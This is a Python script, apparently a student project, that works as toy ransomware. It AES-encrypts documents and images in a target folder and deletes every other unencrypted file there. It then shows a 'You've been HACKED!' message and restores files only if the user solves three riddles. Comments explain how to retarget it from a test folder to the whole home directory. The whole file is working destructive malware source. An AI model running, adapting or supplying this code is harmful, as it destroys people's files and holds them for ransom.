import os
import pathlib
import random
import struct
from Crypto.Cipher import AES
from pprint import pprint
import sys

"""
encrypt_file
This is the encrypt file function, where we use AES encryption to encrypt the file.
The code is simple to understand, we use the key given, generate an IV and use these to
run the AES encryption function
"""
def encrypt_file(key, in_filename):
    out_filename = os.path.splitext(in_filename)[0]
    out_filename = out_filename + '.enc'
    iv = ''.join(random.choice('0123456789') for n in range(16))
    print(sys.getsizeof(iv[1]))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)
    chunksize = 64*1024
    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv.encode('utf-8'))
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += (' ' * (16 - len(chunk) % 16)).encode('utf-8')

                outfile.write(encryptor.encrypt(chunk))
"""
decrypt_file
This is the decrypt file function, where we use the IV and the key to decrypt the file
"""

def decrypt_file(key, in_filename):
    chunksize=24*1024
    out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(origsize)
"""
puzzleOne
A simple puzzle, one of three which you need to solve to decrypt all your files
"""

def puzzleOne():
    answer = ""
    check = 0
    while(answer != "g" or answer != "G"):
        answer = input("What always ends everything?\n")
        if(answer == "g" or answer == "G"):
            print("You got it!\n")
            return 1;
        else:
            while(check != 1):
                print("That's not right you dum dum!\n")
                value = input("Do you give up? (Y/N)\n")
                if(value == "Y"):
                    print("HAHAHA YOU LOSE\n")
                    check = 1
                    return 0;
                elif(value == "N"):
                    check = 1
                    print("Alright, lets try again!\n")
                else:
                    print("Invalid Input")
    return 0;

"""
puzzleTwo
The second puzzle, one step closer to decryption!
"""

def puzzleTwo():
    answer = ""
    check = 0
    while(answer != "g" or answer != "G"):
        answer = input("I can fly, but I don't have wings. I don't have eyes, but I can cry! What I am?\n")
        if(answer == "A cloud" or answer == "a cloud" or answer == "cloud" or answer == "Cloud"  or answer == "A Cloud"  or answer == "a Cloud"):
            print("That's right, one more and you can have your files back!\n")
            return 1;
        else:
            while(check != 1):
                print("Big oof, incorrect my dude!")
                value = input("Do you give up? (Y/N)\n")
                if(value == "Y"):
                    check = 1
                    print("HAHAHA YOU LOSE\n")
                    return 0;
                elif(value == "N"):
                    check = 1
                    print("Have another go!\n")
                else:
                    print("Invalid Input")
    return 0;
"""
puzzleThree
The final puzzle, solve this and your files will be free!!
"""

def puzzleThree():
    answer = ""
    check = 0
    while(answer != "g" or answer != "G"):
        answer = input("Two sisters we are, one is dark and one is fair, \nIn twin towers dwelling we’re quite the pair, \nOne from land and one from sea, \nTell us truly, who are we?\n")
        if(answer == "Salt and Pepper" or answer == "salt and pepper" or answer == "salt and Pepper" or answer == "Salt and pepper"  or answer == "Salt And Pepper"):
            print("That's right, you got it!\n")
            return 1;
        else:
            while(check != 1):
                print("Rip, incorrect dum dum!")
                value = input("Do you give up? (Y/N)\n")
                if(value == "Y"):
                    check = 1
                    print("HAHAHA YOU LOSE\n")
                    return 0;
                elif(value == "N"):
                    check = 1
                    print("Have another go!\n")
                else:
                    print("Invalid Input")
    return 0;

# Call encryption function here

user_home = pathlib.Path.home()
# HI! to not cause complete destruction to you system, to just test our code
# copy the given testfolder into this location
target_folder = "dev/cs460/finalProject/testFolder"
start_path = os.path.join(user_home, target_folder)
print("Running folder scan on " + start_path)

#Now if you're ready for the real thing, uncomment the following lines and comment the ones above!
# start_path = os.path.join(user_home)
# print("Running folder scan on " + start_path)

dir_list = []
file_list = []
"""
Here, we walk through all your files and folders, and encrypt EVERYTHING. MUAHHAHAHHAAA!
"""
key  = ''.join(random.choice('0123456789abcdef') for n in range(32))
for root, dirs, files in os.walk(start_path):
    for name in files:
        if(name.lower().endswith(('.txt', '.png', '.jpg', '.docx', '.pdf'))):
            encrypt_file(key, os.path.join(root, name))
        if(not(name.lower().endswith('.enc'))):
            os.remove(os.path.join(root, name))
        file_list.append(os.path.join(root, name))
    for name in dirs:
        dir_list.append(os.path.join(root, name))

#print("\nDirectories:")
#print(dir_list)
#print("\nFolders:")
#pprint(file_list)

"""
Now that our evil plan has been executed, we will give you peasants a chance to redeem yourselves.
Go ahead and crack these impenetrable defenses(actually very cute puzzles)
"""

num = 0;
print("You've been HACKED! \nSoRrY bUt AlL yOuR fIlEs HaVe bEeN eNcRyPtEd. \nIf YoU wAnT tHeM bAcK, sOlVe thEsE pUzZleS. OThErwIse, wE'lL delEte EveRytHinG!")
num = num + puzzleOne()
if(num == 1):
    num = num + puzzleTwo()
if(num == 2):
    num = num + puzzleThree()
if(num == 3):
    for root, dirs, files in os.walk(start_path):
        for name in files:
            if(name.strip().endswith('.enc')):
                decrypt_file(key, os.path.join(root, name))
            if(name.lower().endswith('.enc')):
                os.remove(os.path.join(root, name))
    print("Your files have been decrypted, enjoy your day!\n")
else:
    print("Sorry, all your files are gone.\n")
